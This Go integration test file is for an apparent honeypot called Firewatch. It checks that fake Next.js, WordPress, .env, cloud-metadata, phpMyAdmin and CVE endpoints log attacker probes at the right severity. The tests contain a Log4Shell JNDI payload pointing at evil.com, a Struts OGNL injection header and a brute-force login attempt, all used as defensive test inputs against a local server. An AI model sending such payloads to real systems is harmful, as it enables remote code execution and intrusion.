package integration_test

import (
	"context"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	"github.com/0xsj/firewatch/internal/config"
	"github.com/0xsj/firewatch/internal/detection"
	"github.com/0xsj/firewatch/internal/fingerprint"
	adminmod "github.com/0xsj/firewatch/internal/handlers/admin"
	apimod "github.com/0xsj/firewatch/internal/handlers/api"
	cloudmod "github.com/0xsj/firewatch/internal/handlers/cloud"
	cvemod "github.com/0xsj/firewatch/internal/handlers/cve"
	exposuremod "github.com/0xsj/firewatch/internal/handlers/exposure"
	nextjsmod "github.com/0xsj/firewatch/internal/handlers/nextjs"
	wpmod "github.com/0xsj/firewatch/internal/handlers/wordpress"
	"github.com/0xsj/firewatch/internal/server"
	"github.com/0xsj/firewatch/internal/storage"
	"github.com/0xsj/firewatch/internal/storage/models"
)

// setupServer creates a full Firewatch server with the given modules
// enabled, backed by a real SQLite database in a temp directory.
// Returns the httptest server and the storage.Store for assertions.
func setupServer(t *testing.T, modules ...string) (*httptest.Server, storage.Store) {
	t.Helper()

	dbPath := filepath.Join(t.TempDir(), "test.db")
	store, err := storage.NewSQLite(dbPath)
	if err != nil {
		t.Fatalf("NewSQLite: %v", err)
	}

	cfg := config.Default()
	for _, mod := range modules {
		switch mod {
		case "nextjs":
			cfg.Modules.NextJS.Enabled = true
		case "wordpress":
			cfg.Modules.WordPress.Enabled = true
		case "exposure":
			cfg.Modules.Exposure.Enabled = true
		case "api":
			cfg.Modules.API.Enabled = true
		case "cloud":
			cfg.Modules.Cloud.Enabled = true
		case "admin":
			cfg.Modules.Admin.Enabled = true
		case "cve":
			cfg.Modules.CVE.Enabled = true
		}
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	fpEngine := fingerprint.NewEngine(nil)
	detector := detection.NewDefault(logger)

	srv := server.New(cfg, store, fpEngine, detector, nil, nil, logger)

	// Mount enabled modules — mirrors cmd/firewatch/main.go wiring.
	for _, mod := range modules {
		switch mod {
		case "nextjs":
			m := nextjsmod.New(cfg.Modules.NextJS, cfg.Deception, store, logger)
			for _, route := range m.Routes() {
				srv.Router().HandleFunc(route.Pattern, route.Handler)
			}
		case "wordpress":
			m := wpmod.New(cfg.Modules.WordPress, cfg.Deception, store, logger)
			for _, route := range m.Routes() {
				srv.Router().HandleFunc(route.Pattern, route.Handler)
			}
		case "exposure":
			m := exposuremod.New(cfg.Modules.Exposure, cfg.Deception, store, logger)
			for _, route := range m.Routes() {
				srv.Router().HandleFunc(route.Pattern, route.Handler)
			}
		case "api":
			m := apimod.New(cfg.Modules.API, cfg.Deception, store, logger)
			for _, route := range m.Routes() {
				srv.Router().HandleFunc(route.Pattern, route.Handler)
			}
		case "cloud":
			m := cloudmod.New(cfg.Modules.Cloud, cfg.Deception, store, logger)
			for _, route := range m.Routes() {
				srv.Router().HandleFunc(route.Pattern, route.Handler)
			}
		case "admin":
			m := adminmod.New(cfg.Modules.Admin, cfg.Deception, store, logger)
			for _, route := range m.Routes() {
				srv.Router().HandleFunc(route.Pattern, route.Handler)
			}
		case "cve":
			m := cvemod.New(cfg.Modules.CVE, cfg.Deception, store, logger)
			for _, route := range m.Routes() {
				srv.Router().HandleFunc(route.Pattern, route.Handler)
			}
		}
	}

	ts := httptest.NewServer(srv.HTTPServer().Handler)
	t.Cleanup(func() {
		ts.Close()
		store.Close()
	})

	return ts, store
}

// listEvents returns all events from the store.
func listEvents(t *testing.T, store storage.Store) []*models.Event {
	t.Helper()
	events, err := store.ListEvents(context.Background(), storage.EventFilter{})
	if err != nil {
		t.Fatalf("ListEvents: %v", err)
	}
	return events
}

// --- Next.js ---

func TestNextJSPage(t *testing.T) {
	ts, store := setupServer(t, "nextjs")

	resp, err := http.Get(ts.URL + "/")
	if err != nil {
		t.Fatalf("GET /: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		t.Errorf("status = %d, want 200", resp.StatusCode)
	}
	if !strings.Contains(string(body), "__next") {
		t.Error("response body missing __next")
	}

	events := listEvents(t, store)
	found := false
	for _, e := range events {
		if e.Module == "nextjs" {
			found = true
			break
		}
	}
	if !found {
		t.Error("no event with module=nextjs recorded")
	}
}

func TestNextJSServerAction(t *testing.T) {
	ts, store := setupServer(t, "nextjs")

	req, _ := http.NewRequest("POST", ts.URL+"/", strings.NewReader("payload"))
	req.Header.Set("Next-Action", "abc123")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("POST /: %v", err)
	}
	resp.Body.Close()

	events := listEvents(t, store)
	foundHigh := false
	for _, e := range events {
		if e.Module == "nextjs" && (e.Severity == "high" || e.Severity == "critical") {
			foundHigh = true
			break
		}
	}
	if !foundHigh {
		t.Error("expected a high/critical severity nextjs event for server action probe")
	}
}

// --- WordPress ---

func TestWordPressLogin(t *testing.T) {
	ts, store := setupServer(t, "wordpress")

	resp, err := http.Get(ts.URL + "/wp-login.php")
	if err != nil {
		t.Fatalf("GET /wp-login.php: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		t.Errorf("status = %d, want 200", resp.StatusCode)
	}
	if !strings.Contains(string(body), "WordPress") {
		t.Error("response body missing WordPress")
	}

	events := listEvents(t, store)
	found := false
	for _, e := range events {
		if e.Module == "wordpress" {
			found = true
			break
		}
	}
	if !found {
		t.Error("no event with module=wordpress recorded")
	}
}

func TestWordPressBruteForce(t *testing.T) {
	ts, store := setupServer(t, "wordpress")

	resp, err := http.Post(ts.URL+"/wp-login.php",
		"application/x-www-form-urlencoded",
		strings.NewReader("log=admin&pwd=password123"))
	if err != nil {
		t.Fatalf("POST /wp-login.php: %v", err)
	}
	resp.Body.Close()

	events := listEvents(t, store)
	foundHigh := false
	for _, e := range events {
		if e.Module == "wordpress" && (e.Severity == "high" || e.Severity == "critical") {
			foundHigh = true
			break
		}
	}
	if !foundHigh {
		t.Error("expected a high severity wordpress event for brute force attempt")
	}
}

// --- Exposure ---

func TestExposureEnvFile(t *testing.T) {
	ts, store := setupServer(t, "exposure")

	resp, err := http.Get(ts.URL + "/.env")
	if err != nil {
		t.Fatalf("GET /.env: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		t.Errorf("status = %d, want 200", resp.StatusCode)
	}
	if !strings.Contains(string(body), "DB_") {
		t.Error("response body missing DB_ credential pattern")
	}

	events := listEvents(t, store)
	found := false
	for _, e := range events {
		if e.Module == "exposure" {
			found = true
			break
		}
	}
	if !found {
		t.Error("no event with module=exposure recorded")
	}
}

// --- API ---

func TestAPIGraphQL(t *testing.T) {
	ts, store := setupServer(t, "api")

	resp, err := http.Post(ts.URL+"/graphql",
		"application/json",
		strings.NewReader(`{"query": "{ users { id } }"}`))
	if err != nil {
		t.Fatalf("POST /graphql: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		t.Errorf("status = %d, want 200", resp.StatusCode)
	}
	if !strings.Contains(string(body), "errors") {
		t.Error("response body missing JSON errors field")
	}

	events := listEvents(t, store)
	found := false
	for _, e := range events {
		if e.Module == "api" {
			found = true
			break
		}
	}
	if !found {
		t.Error("no event with module=api recorded")
	}
}

// --- Cloud ---

func TestCloudMetadata(t *testing.T) {
	ts, store := setupServer(t, "cloud")

	resp, err := http.Get(ts.URL + "/latest/meta-data/")
	if err != nil {
		t.Fatalf("GET /latest/meta-data/: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		t.Errorf("status = %d, want 200", resp.StatusCode)
	}

	events := listEvents(t, store)
	found := false
	for _, e := range events {
		if e.Module == "cloud" {
			found = true
			break
		}
	}
	if !found {
		t.Error("no event with module=cloud recorded")
	}
}

// --- Admin ---

func TestAdminPhpMyAdmin(t *testing.T) {
	ts, store := setupServer(t, "admin")

	resp, err := http.Get(ts.URL + "/phpmyadmin/")
	if err != nil {
		t.Fatalf("GET /phpmyadmin/: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		t.Errorf("status = %d, want 200", resp.StatusCode)
	}
	if !strings.Contains(string(body), "phpMyAdmin") {
		t.Error("response body missing phpMyAdmin")
	}

	events := listEvents(t, store)
	found := false
	for _, e := range events {
		if e.Module == "admin" {
			found = true
			break
		}
	}
	if !found {
		t.Error("no event with module=admin recorded")
	}
}

// --- CVE ---

func TestCVESolrProbe(t *testing.T) {
	ts, store := setupServer(t, "cve")

	resp, err := http.Get(ts.URL + "/solr/admin/cores")
	if err != nil {
		t.Fatalf("GET /solr/admin/cores: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		t.Errorf("status = %d, want 200", resp.StatusCode)
	}
	if !strings.Contains(string(body), "core0") {
		t.Error("response body missing core0")
	}

	events := listEvents(t, store)
	found := false
	for _, e := range events {
		if e.Module == "cve" {
			found = true
			break
		}
	}
	if !found {
		t.Error("no event with module=cve recorded")
	}
}

func TestCVELog4Shell(t *testing.T) {
	ts, store := setupServer(t, "cve")

	resp, err := http.Post(ts.URL+"/solr/admin/cores",
		"text/plain",
		strings.NewReader("${jndi:ldap://evil.com/a}"))
	if err != nil {
		t.Fatalf("POST /solr/admin/cores: %v", err)
	}
	resp.Body.Close()

	events := listEvents(t, store)

	// Look for critical severity event from the handler.
	foundCritical := false
	sigCount := 0
	for _, e := range events {
		if e.Module == "cve" && e.Severity == "critical" {
			foundCritical = true
			sigCount = len(e.Signatures)
			break
		}
	}
	if !foundCritical {
		t.Error("expected a critical severity cve event for Log4Shell JNDI payload")
	}
	if sigCount < 2 {
		t.Errorf("expected at least 2 signatures on critical cve event, got %d", sigCount)
	}
}

func TestCVEStrutsOGNL(t *testing.T) {
	ts, store := setupServer(t, "cve")

	req, _ := http.NewRequest("POST", ts.URL+"/struts2-showcase/", strings.NewReader("test"))
	req.Header.Set("Content-Type", "%{(#_='multipart/form-data')}")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("POST /struts2-showcase/: %v", err)
	}
	resp.Body.Close()

	events := listEvents(t, store)
	foundCritical := false
	for _, e := range events {
		if e.Module == "cve" && e.Severity == "critical" {
			foundCritical = true
			break
		}
	}
	if !foundCritical {
		t.Error("expected a critical severity cve event for Struts OGNL injection")
	}
}

// --- Cross-cutting ---

func TestDetectionMiddleware(t *testing.T) {
	ts, store := setupServer(t, "wordpress")

	resp, err := http.Get(ts.URL + "/wp-login.php")
	if err != nil {
		t.Fatalf("GET /wp-login.php: %v", err)
	}
	resp.Body.Close()

	events := listEvents(t, store)
	if len(events) < 2 {
		t.Fatalf("expected at least 2 events (detection middleware + handler), got %d", len(events))
	}

	// Verify we have events from both the detection middleware and the handler.
	hasDetection := false
	hasWordpress := false
	for _, e := range events {
		if e.Module == "detection" {
			hasDetection = true
		}
		if e.Module == "wordpress" {
			hasWordpress = true
		}
	}
	if !hasDetection {
		t.Error("missing detection middleware event")
	}
	if !hasWordpress {
		t.Error("missing wordpress handler event")
	}
}

func TestCorrelationRequestID(t *testing.T) {
	ts, store := setupServer(t, "nextjs")

	resp, err := http.Get(ts.URL + "/")
	if err != nil {
		t.Fatalf("GET /: %v", err)
	}
	resp.Body.Close()

	// Check that the response has a request ID header.
	reqID := resp.Header.Get("X-Request-Id")
	if reqID == "" {
		t.Fatal("response missing X-Request-Id header")
	}

	events := listEvents(t, store)
	if len(events) == 0 {
		t.Fatal("no events recorded")
	}
	for _, e := range events {
		if e.RequestID == "" {
			t.Errorf("event %s has empty RequestID", e.ID)
		}
	}
}

func TestMultiModuleIsolation(t *testing.T) {
	ts, store := setupServer(t, "nextjs", "wordpress", "exposure", "api", "cloud", "admin", "cve")

	resp, err := http.Get(ts.URL + "/wp-login.php")
	if err != nil {
		t.Fatalf("GET /wp-login.php: %v", err)
	}
	resp.Body.Close()

	events := listEvents(t, store)
	if len(events) == 0 {
		t.Fatal("no events recorded")
	}

	for _, e := range events {
		// Events should only come from wordpress or detection middleware.
		if e.Module != "wordpress" && e.Module != "detection" {
			t.Errorf("unexpected module %q for /wp-login.php request (event %s)", e.Module, e.ID)
		}
	}
}
